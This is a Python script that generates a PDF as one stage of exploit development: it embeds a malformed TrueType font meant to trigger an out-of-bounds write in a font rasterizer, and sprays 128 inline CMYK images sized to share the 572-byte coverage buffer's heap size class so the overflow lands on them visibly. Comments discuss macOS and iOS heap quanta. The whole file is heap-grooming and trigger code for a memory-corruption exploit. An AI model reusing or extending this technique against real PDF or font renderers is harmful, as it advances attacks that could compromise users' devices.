#!/usr/bin/env python3
"""Step 2a v2: Visual OOB Confirmation with CORRECT spray sizing.

Key fix: spray images must be in the SAME malloc size class as the
coverage buffer (572 bytes) to be heap-adjacent. Previous version used
5120-byte images which land in a different size class.

Coverage buffer = 572 bytes → malloc(572) → same quantum
Spray image = 11x13 CMYK = 11*13*4 = 572 bytes → malloc(572) → same quantum!

Each pixel = 60/11 ≈ 5.5px wide on screen → corruption IS visible.

OOB = +5120 bytes forward = 8 quanta (at 640 bytes/quantum on macOS).
On iOS the quantum may differ, so we spray 128 images to maximize coverage.

The corrupted image's top-left pixel will show a different color from
the uniform 0x80 gray fill.
"""
import sys
import zlib

FONT = sys.argv[2] if len(sys.argv) > 2 else "neg_tx_trigger.ttf"
PTSIZE = 1024

# CMYK image sizing: 11 x 13 x 4 = 572 bytes = coverage buffer size
IMG_W = 11
IMG_H = 13
IMG_COMPONENTS = 4  # CMYK
IMG_BYTES = IMG_W * IMG_H * IMG_COMPONENTS  # 572

NUM_SPRAY = 128  # lots of spray to surround the coverage buffer
GRID_COLS = 16
GRID_ROWS = 8

RECT_W = 44
RECT_H = 44
MARGIN = 4
PAGE_W = GRID_COLS * (RECT_W + MARGIN) + MARGIN
PAGE_H = GRID_ROWS * (RECT_H + MARGIN) + MARGIN + 120

# Fill: 0x40 for C/M/Y, 0x00 for K → renders as a teal/cyan-ish gray
# If OOB corrupts byte 0 (C channel of pixel 0,0), color shifts visibly
FILL_C = 0x40
FILL_M = 0x40
FILL_Y = 0x40
FILL_K = 0x00


def make_spray_stream():
    ops = []
    pixel_data = bytes([FILL_C, FILL_M, FILL_Y, FILL_K]) * (IMG_W * IMG_H)
    assert len(pixel_data) == IMG_BYTES

    for i in range(NUM_SPRAY):
        col = i % GRID_COLS
        row = i // GRID_COLS
        x = MARGIN + col * (RECT_W + MARGIN)
        y = PAGE_H - 120 - MARGIN - (row + 1) * (RECT_H + MARGIN) + MARGIN

        ops.append(
            f"q\n"
            f"{RECT_W} 0 0 {RECT_H} {x} {y} cm\n"
            f"BI\n"
            f"/W {IMG_W}\n"
            f"/H {IMG_H}\n"
            f"/CS /CMYK\n"
            f"/BPC 8\n"
            f"ID\n".encode()
            + pixel_data
            + b"\nEI\nQ\n"
        )

    return b"".join(ops)


def make_trigger_stream():
    return f"BT /F1 {PTSIZE} Tf 5 {PAGE_H - 60} Td (A) Tj ET\n".encode()


def make_label_stream():
    ops = []
    ops.append(
        f"BT /F2 12 Tf 10 {PAGE_H - 20} Td "
        f"(OOB Confirm v2: 128x 11x13 CMYK spray \\(572 bytes = coverage buffer size\\)) Tj ET\n".encode()
    )
    ops.append(
        f"BT /F2 9 Tf 10 {PAGE_H - 38} Td "
        f"(Corrupted square = top-left pixel changes color. OOB = +5120 bytes = 8 quanta forward.) Tj ET\n".encode()
    )
    return b"".join(ops)


def build(dst):
    ttf = open(FONT, "rb").read()
    ttf_z = zlib.compress(ttf)

    labels = make_label_stream()
    spray = make_spray_stream()
    trigger = make_trigger_stream()
    content = labels + spray + trigger

    objs = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        (b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 %d %d] "
         b"/Resources << /Font << /F1 5 0 R /F2 8 0 R >> >> "
         b"/Contents 4 0 R >>" % (PAGE_W, PAGE_H)),
        b"<< /Length %d >>\nstream\n" % len(content) + content + b"endstream",
        b"<< /Type /Font /Subtype /TrueType /BaseFont /CVEFont "
        b"/FirstChar 65 /LastChar 65 /Widths [100] "
        b"/Encoding /WinAnsiEncoding /FontDescriptor 6 0 R >>",
        b"<< /Type /FontDescriptor /FontName /CVEFont /Flags 4 "
        b"/FontBBox [0 0 2 40] /ItalicAngle 0 /Ascent 100 /Descent -100 "
        b"/CapHeight 100 /StemV 80 /FontFile2 7 0 R >>",
        b"<< /Length %d /Length1 %d /Filter /FlateDecode >>\nstream\n"
        % (len(ttf_z), len(ttf)) + ttf_z + b"\nendstream",
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]

    out = bytearray(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n")
    off = []
    for i, body in enumerate(objs, 1):
        off.append(len(out))
        out += b"%d 0 obj\n" % i + body + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
    for o in off:
        out += b"%010d 00000 n \n" % o
    out += (b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n"
            % (len(objs) + 1, xref))

    open(dst, "wb").write(out)
    print(f"wrote {dst} ({len(out):,} bytes)")
    print(f"  spray: {NUM_SPRAY} CMYK inline images, {IMG_W}x{IMG_H}x{IMG_COMPONENTS} = {IMG_BYTES} bytes each")
    print(f"  fill: C={FILL_C:#x} M={FILL_M:#x} Y={FILL_Y:#x} K={FILL_K:#x}")
    print(f"  grid: {GRID_COLS}x{GRID_ROWS}, rect size {RECT_W}x{RECT_H}")
    print(f"  pixel visibility: each pixel ≈ {RECT_W/IMG_W:.1f}x{RECT_H/IMG_H:.1f} screen px")
    print(f"  trigger: N=10, DX=2, TX=-16367, Tf={PTSIZE}")
    print(f"  OOB: +5120 bytes forward -> corrupts 1 spray image pixels")


if __name__ == "__main__":
    build(sys.argv[1] if len(sys.argv) > 1 else "oob_confirm_v2.pdf")
